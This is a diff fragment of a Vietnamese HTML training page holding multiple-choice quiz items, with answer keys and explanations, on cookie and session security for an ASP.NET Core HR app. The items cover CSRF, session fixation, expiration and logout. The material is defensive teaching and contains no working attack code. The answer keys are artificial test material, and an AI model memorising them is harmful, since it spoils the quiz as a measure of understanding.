+    why: ["Lax chỉ chặn request cross-site “ngầm” (POST form, iframe, ảnh, fetch); bấm link điều hướng top-level bằng GET vẫn kèm cookie.", "Đúng: Lax cố tình cho phép bấm link GET; vì vậy GET phải là thao tác an toàn (chỉ đọc), thay đổi dữ liệu dùng POST/PUT/DELETE kèm anti-CSRF.", "SameSite không phụ thuộc trang nguồn có HTTPS hay không; nó xét request là same-site hay cross-site và loại điều hướng.", "HttpOnly chỉ chặn JavaScript đọc cookie, không ảnh hưởng việc trình duyệt tự gửi cookie."],
+    explain: "Lax = người nhà + khách bấm link vào xem (GET). Endpoint GET có tác dụng phụ là tự mở cửa cho CSRF. Xem <a href='#cookie-attributes'>Thuộc tính cookie</a>." },
+  { q: "Vì cần nhúng hr-web vào iframe của cổng nội bộ, cookie đăng nhập được đặt <code>HttpOnly; Secure; SameSite=None</code>. Một trang lừa đảo tự submit form ẩn <code>POST /bank-account</code> tới hr-web. Biện pháp nào thực sự chặn được tấn công này?",
+    options: ["<code>HttpOnly</code> — script của trang lừa đảo không đọc được cookie", "Anti-CSRF token được hr-web kiểm tra ở mọi request thay đổi dữ liệu", "<code>Secure</code> — cookie chỉ đi qua HTTPS", "Nếu bỏ được nhu cầu iframe: đổi sang <code>SameSite=Lax</code>"],
+    answer: [1, 3],
+    why: ["CSRF không cần đọc cookie — trình duyệt tự đính kèm nó; HttpOnly chống XSS đánh cắp cookie, không chống CSRF.", "Đúng: trang lừa đảo không biết giá trị anti-CSRF token nên request giả bị từ chối.", "Trang lừa đảo vẫn gửi form qua HTTPS tới hr-web; Secure chỉ chống nghe lén trên đường truyền.", "Đúng: với Lax, POST cross-site không kèm cookie, nên request giả không mang phiên của An."],
+    explain: "HttpOnly và Secure không chống CSRF; chống CSRF là SameSite + anti-CSRF token. Xem <a href='m06-3-web-threats.html#csrf'>CSRF ở M06</a>." },
+  { q: "Kẻ tấn công mở hr-web, nhận <code>sid=ABC</code>, rồi tìm cách cài <code>sid=ABC</code> vào trình duyệt của An. An đăng nhập thành công. Biện pháp nào chặn đúng kiểu tấn công này?",
+    options: ["Tăng độ dài session ID lên 256 bit", "Sau khi đăng nhập thành công, cấp session ID mới và hủy ID cũ", "Bật <code>HttpOnly</code> cho cookie phiên", "Chuyển session ID từ cookie sang tham số URL"],
+    answer: 1,
+    why: ["Kẻ tấn công không cần đoán ID — hắn đã biết sẵn <code>ABC</code>; ID dài đến đâu cũng vậy.", "Đúng: sau login, <code>ABC</code> bị hủy, phiên đã đăng nhập gắn với ID mới mà kẻ tấn công không biết.", "HttpOnly ngăn JavaScript đọc cookie, nhưng kẻ tấn công không cần đọc — hắn tự cài giá trị đã biết.", "Đưa session ID lên URL còn làm lộ nó qua log, lịch sử, <code>Referer</code> và giúp cài ID dễ hơn."],
+    explain: "Session fixation: luôn regenerate session ID sau login và sau khi nâng quyền. Xem <a href='#session-fixation'>Session fixation</a>." },
+  { q: "hr-web cấu hình <code>ExpireTimeSpan = 30 phút</code>, <code>SlidingExpiration = true</code>, và không có kiểm tra nào khác. Kẻ tấn công chép được cookie đăng nhập của An rồi chạy script gửi request mỗi 5 phút. Phát biểu nào đúng?",
+    options: ["Cookie hết hạn sau 30 phút kể từ lúc bị đánh cắp", "Kẻ tấn công dùng được vô thời hạn (tới khi bị phát hiện/thu hồi), vì mỗi request lại gia hạn phiên", "Cookie hết hạn khi An đóng trình duyệt của mình", "Cookie hết hạn sau 8 giờ theo mặc định của ASP.NET Core"],
+    answer: 1,
+    why: ["Sliding expiration gia hạn khi còn hoạt động, nên request đều đặn giữ phiên sống mãi.", "Đúng: chỉ có idle timeout thì phiên bị “giữ ấm” liên tục; cần thêm absolute timeout để giới hạn tối đa.", "Đóng trình duyệt của An không ảnh hưởng bản cookie kẻ tấn công đã chép; ticket còn hạn vẫn hợp lệ.", "ASP.NET Core không có absolute timeout mặc định — phải tự kiểm tra thời điểm login."],
+    explain: "Nên có cả idle timeout lẫn absolute timeout. Xem <a href='#timeouts'>Idle timeout và absolute timeout</a>." },
+  { q: "hr-web dùng cookie authentication mặc định của ASP.NET Core (ticket mã hóa trong cookie, không cấu hình <code>SessionStore</code>, không kiểm tra security stamp). Logout chỉ gọi <code>SignOutAsync</code> để xóa cookie trên trình duyệt. Một bản cookie đã bị chép trước đó thì sao?", tricky: true,
+    options: ["Hết hiệu lực ngay vì server đã xóa session trong Redis", "Vẫn dùng được tới khi ticket hết hạn, vì server không lưu gì để “xóa” — ticket tự chứng minh nó hợp lệ", "Hết hiệu lực vì Data Protection tự đổi key sau mỗi lần logout", "Không dùng được vì cookie có <code>HttpOnly</code>"],
+    answer: 1,
+    why: ["Cấu hình mặc định là stateless — không có bản ghi session nào ở server để xóa; Redis chỉ có khi bạn tự cấu hình <code>ITicketStore</code>.", "Đúng: <code>SignOutAsync</code> chỉ bảo trình duyệt xóa cookie; ticket mã hóa còn hạn vẫn giải mã và hợp lệ ở server.", "Data Protection không xoay key theo từng lần logout; key xoay theo chu kỳ dài và key cũ vẫn được giữ để giải mã.", "HttpOnly không liên quan: kẻ tấn công gửi cookie đã chép trong request của hắn, không cần JavaScript."],
+    explain: "Muốn logout thu hồi phía server: dùng <code>ITicketStore</code> (stateful) hoặc đánh dấu thu hồi (security stamp). Xem <a href='#logout'>Logout phải hủy session phía server</a>." },
+  { q: "Dev đổi cookie đăng nhập từ <code>__Host-hr_auth</code> sang <code>hr_auth; Domain=kaopiz.local</code> “để cho chặt hơn”. Những hệ quả nào xảy ra?",
+    options: ["Cookie được gửi cho mọi subdomain như <code>blog.kaopiz.local</code>", "Cookie chỉ còn gửi cho đúng <code>hr.kaopiz.local</code>", "Mất bảo vệ của prefix <code>__Host-</code>: subdomain khác có thể ghi đè/cài cookie cùng tên", "SameSite sẽ chặn subdomain khác đọc cookie"],
+    answer: [0, 2],
+    why: ["Đúng: đặt Domain là mở rộng phạm vi tới mọi subdomain, không phải thu hẹp.", "Đó là hành vi của cookie host-only (không đặt Domain) — đúng cái vừa bị bỏ đi.", "Đúng: <code>__Host-</code> buộc không có Domain để khóa cookie vào một host; bỏ prefix thì subdomain khác có thể set cookie cùng tên cho cả domain (tiền đề cho session fixation).", "Các subdomain của <code>kaopiz.local</code> là same-site, nên SameSite không áp dụng giữa chúng."],
+    explain: "Không đặt Domain + prefix <code>__Host-</code> là cấu hình chặt nhất. Xem <a href='#cookie-attributes'>Thuộc tính cookie</a>." }
+];
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/pages.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
